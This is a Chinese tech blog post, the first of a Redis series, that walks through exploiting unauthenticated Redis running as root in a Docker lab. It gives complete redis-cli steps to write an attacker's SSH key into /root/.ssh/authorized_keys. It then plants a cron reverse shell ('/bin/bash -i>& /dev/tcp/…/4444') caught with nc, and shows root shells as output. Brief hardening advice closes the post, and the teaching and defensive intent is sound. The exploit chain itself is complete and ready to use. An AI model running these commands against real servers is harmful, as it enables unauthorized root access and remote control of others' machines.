---
title: 小白的 redis 1 安全漏洞
---
首发于公众号：董泽润的技术笔记，转载请指明出处。

大概在 2011 年第一次听说 redis, 由于其丰富的数据结构，高性能，经过几年的发展 redis 己经成了构建高并发服务的标配。吐糟一下 aws redis 真贵...

在赶集网的时候开始真正使用 redis, 陆陆续续也做过相关的开发工作，也遇到过各种各样的问题，所以想系统的梳理下 redis 相关的知识。计划将**小白的 redis**做成一个系列，由浅入深，分享从简单的数据结构使用到底层原理的实现，涉及到部份 c 代码。
### 安全意识
安全是 IT 永远绕不开的话题，但恰恰是互联网从业者最容易忽视的。从最早的 web 劫持，sql 注入，到最近几年流行的挖矿病毒，很多只要稍微留心都可以避免，解决方法可能很简单，比如使用普通用户运行程序、form 表单提交的数据做校验等等...

但是因为信息不对称，开发人员不关注(不是 KPI)，没有安全意识，导致被拖库，被攻击等等。这也是为什么系列的第一篇要从安全开始讲起。

另外说一个暴露年龄的病毒：`熊猫烧香` :)

![](https://gitee.com/dongzerun/images/raw/master/img/%E5%B0%8F%E7%99%BDredis1.1.jpg)

### redis 漏洞
历史上 redis 就暴露过很多漏洞，感兴趣的可以关注下 **CVE-2015-8080** lua 沙盒逃逸、**CVE-2015-4335** eval 执行 lua 字节码、**CVE-2016-8339** 缓冲区溢出漏洞、**CVE-2013-7458** 读取 rediscli_history.
### 远程执行
前两年有人统计，监听公网地址，并且没有验证的 redis, mongodb, mysql 等等数据库服务一大堆，很多服务器都成了黑客的肉鸡，用来攻击别的服务，加密数据索要比特币。

特别是当 redis 是用 root 身份运行的，就算有 auth 认证，也很容易被暴力破解。本篇分享的就是利用这一特点获得被攻击 redis 服务器的登录权限，即未授权登录漏洞。

![](https://gitee.com/dongzerun/images/raw/master/img/%E5%B0%8F%E7%99%BDredis1.2.jpg)

上图是相关的思维导图，原理就是修改 redis 配置，间接修改 ssh 相关文件或是 crontab 文件。
```
docker run --hostname redis-server -it mycentos /bin/bash
```
使用 docker 运行 redis-server 服务器，ip 地址是 172.17.0.3
```
docker run --hostname attack-client -it mycentos /bin/bash
```
使用 docker 运行攻击测试服务器，ip 地址是 172.17.0.2

#### 1. 获取 root
在测试服务器上启动 redis, 注意将 bind 设为 0.0.0.0
```
[root@redis-server src]# ./redis-server ./redis.conf
```
在 client 服务器上连接 redis-server, 修改 redis 运行目录以及 dbfilename
```
[root@attack-client src]# ./redis-cli -h 172.17.0.3 -p 6379
172.17.0.3:6379> config set dir /root/.ssh
OK
172.17.0.3:6379> config set dbfilename authorized_keys
OK
```
将测试服务器的公钥当成 value 写到 redis, 如果没有请先用 ssh-keygen 生成
```
[root@attack-client src]# (echo -e "\n\n";cat /root/.ssh/id_rsa.pub;echo -e "\n\n") > 1.txt
[root@attack-client src]# cat 1.txt | ./redis-cli -h 172.17.0.3 -x set xxx
OK
[root@attack-client src]# ./redis-cli -h 172.17.0.3 -p 6379
172.17.0.3:6379> get xxx
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMpXeZIVuv6f+DJ29BI7XJHCNG5qsGGCdUv+V2GqKl1vzWXMtt8jibuCztWG3DhOv+o5UJGXnmQNDKDyGRjVbSWPAMzGQBojS8nS1ciHoJr+Wy617MK0gjqkP5FgDOK6I6rRlFufaQJhMOUh3RFH2RkL5X3iKzKl2IYS9BzQsJf18NlU9raPlhZ84a+EhzEE+Ub//wccDLWKzsKBVPuexcLqVxQRtDgtZ2Y0ReweVquiBfimFbYSHqx4RztCrY/4vWmklGGsi0Mz+H1O3NHHP1FdMqgUwUSdxLm77IJKNvgeN+Mfe7D56g4S1TabqXDGH2W306BSP5CtXwpXv9fAzBktKRxkRsn/RJrslKREsMY6W5osWDyfvjaxxdjFCsqhDDuGI8WWdfKeAhCph7GjoaMlXFdpOwuP0W3fx35p6hU8orMIXglwIRYD6prF8lfhd5J3V1HdfdHVfElsW6nAXTOAxGI6rO1n/pg8Tf1kFC/gTwkgT68iVU2kVwnmZ1VXc= root@attack-client\n\n\n\n"
172.17.0.3:6379> save
OK
```
退出 redis 后，即可登录
```
[root@attack-client src]# ssh root@172.17.0.3
"System is booting up. Unprivileged users are not permitted to log in yet. Please come back later. For technical details, see pam_nologin(8)."
[root@redis-server ~]#
[root@redis-server ~]#
[root@redis-server ~]# ls
anaconda-ks.cfg  anaconda-post.log  original-ks.cfg
[root@redis-server ~]# pwd
/root
[root@redis-server ~]# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
3: ip6tnl0@NONE: <NOARP> mtu 1452 qdisc noop state DOWN group default qlen 1000
    link/tunnel6 :: brd ::
20: eth0@if21: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```
其实这里利用了 ssh key 的一个漏洞，即如果遇到非法的认证就忽略，继续检测下一行文本，这就是为什么我们构造的攻击 value 前后要加上两个换行的原因。
#### 2. 反弹 shell
反弹 shell 和上面的原理一样，也是利用了 crontab 格式的漏洞。先在攻击测试机开新的 session, 监听端口
```
[root@attack-client src]# nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```
然后修改 config
```
[root@attack-client src]# ./redis-cli -h 172.17.0.3 -p 6379
172.17.0.3:6379> config set dir /var/spool/cron
OK
172.17.0.3:6379> config set dbfilename root
OK
```
上面其实就是构造了 /var/spool/cron/root, 然后生成攻击 key 并保存，其中 value 是一个合法的 crontab
```
172.17.0.3:6379> set xxx "\n\n*/1 * * * * /bin/bash -i>& /dev/tcp/172.17.0.2/4444 0>&1\n\n"
OK
172.17.0.3:6379> get xxx
"\n\n*/1 * * * * /bin/bash -i>& /dev/tcp/172.17.0.2/4444 0>&1\n\n"
172.17.0.3:6379> save
OK
```

![](https://gitee.com/dongzerun/images/raw/master/img/%E5%B0%8F%E7%99%BDredis1.3.jpg)

可以看到 redis 端的 crontab 己经生成，过一会，client 端 nc 就会收到来自 redis 服务器的 shell
```
[root@attack-client src]# nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.3.
Ncat: Connection from 172.17.0.3:53366.
[root@redis-server]# ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
3: ip6tnl0@NONE: <NOARP> mtu 1452 qdisc noop state DOWN group default qlen 1000
    link/tunnel6 :: brd ::
20: eth0@if21: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft foreve
```

**另外经过测试，ubuntu 服务器对 crontab 文件有权限校验，攻击会失败，并报错**
```
Feb  5 13:47:01 ubuntu2 cron[754]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
```
### 漏洞修复
其实漏洞修复也很简单，整体来说这几点也适用于其它服务
1. 杜绝 root 用户，使用不能登录的普通用户运行 redis
2. 设置 auth 密码，尽量是复杂一些的
3. redis 只临听内网
4. 设置防火墙，但是一般公司内网是全通的

### 小结
本篇到此结束，如有问题请大家斧正，欢迎订阅公众号 **董泽润的技术笔记**，以后会有更多关于技术，排查 bug 的分享

![](https://gitee.com/dongzerun/images/raw/master/img/dongzerun-weixin-code.png)


